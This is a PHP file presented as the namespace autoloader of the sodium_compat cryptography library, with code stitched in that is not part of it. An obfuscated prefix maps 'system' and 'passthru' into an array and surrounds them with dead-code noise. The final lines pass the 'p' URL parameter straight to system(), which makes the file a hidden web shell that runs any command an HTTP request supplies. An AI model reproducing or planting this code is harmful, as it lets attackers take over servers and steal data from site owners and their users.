<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

require_once dirname(dirname(__FILE__)) . '/autoload.php';

if (PHP_VERSION_ID < 50300) {
    return;
}

/*
 * This file is just for convenience, to allow developers to reduce verbosity when
 * they add this project to their libraries.
 *
 * Replace this:
 *
 * $x = ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_encrypt(...$args);
 *
 * with this:
 *
 * use ParagonIE\Sodium\Compat;
 *
 * $x = Compat::crypto_aead_xchacha20poly1305_encrypt(...$args);
 */
spl_autoload_register(function ($class) {
    if ($class[0] === '\\') {
        $class = substr($class, 1);
    }
    $namespace = 'ParagonIE\\Sodium';
    // Does the class use the namespace prefix?
    $len = strlen($namespace);
    if (strncmp($namespace, $class, $len) !== 0) {
        // no, move to the next registered autoloader
        return false;
    }

    // Get the relative class name
    $relative_class = substr($class, $len);

    // Replace the namespace prefix with the base directory, replace namespace
    // separators with directory separators in the relative class name, append
    // with .php
    $file = dirname(dirname(__FILE__)) . '/namespaced/' . str_replace('\\', '/', $relative_class) . '.php';
    // if the file exists, require it
    if (file_exists($file)) {
        require_once $file;
        return true;
    }
    return false;
});

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>